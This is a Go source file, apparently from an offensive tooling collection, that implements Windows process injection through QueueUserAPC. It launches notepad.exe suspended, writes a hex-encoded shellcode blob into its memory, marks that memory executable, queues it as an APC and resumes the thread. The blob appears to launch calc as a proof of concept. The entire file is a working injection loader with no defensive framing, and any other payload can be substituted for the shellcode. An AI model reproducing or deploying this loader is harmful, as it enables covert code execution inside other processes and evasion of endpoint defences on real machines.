package injection

import (
	"encoding/hex"
	"fmt"
	"log"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func QueueUserAPC() {
	fmt.Println("Starting QueueUserApc")
	shellcode, _ := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	QueueUserAPC := kernel32.NewProc("QueueUserAPC")

	procInfo := &windows.ProcessInformation{}
	startupInfo := &windows.StartupInfo{
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}
	windows.CreateProcess(syscall.StringToUTF16Ptr("C:\\Windows\\System32\\notepad.exe"), syscall.StringToUTF16Ptr(""), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	oldProtect := windows.PAGE_READWRITE
	VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	QueueUserAPC.Call(addr, uintptr(procInfo.Thread), 0)

	windows.ResumeThread(procInfo.Thread)
	windows.CloseHandle(procInfo.Process)
	windows.CloseHandle(procInfo.Thread)
	fmt.Println("Finished QueueUserAPC")
}
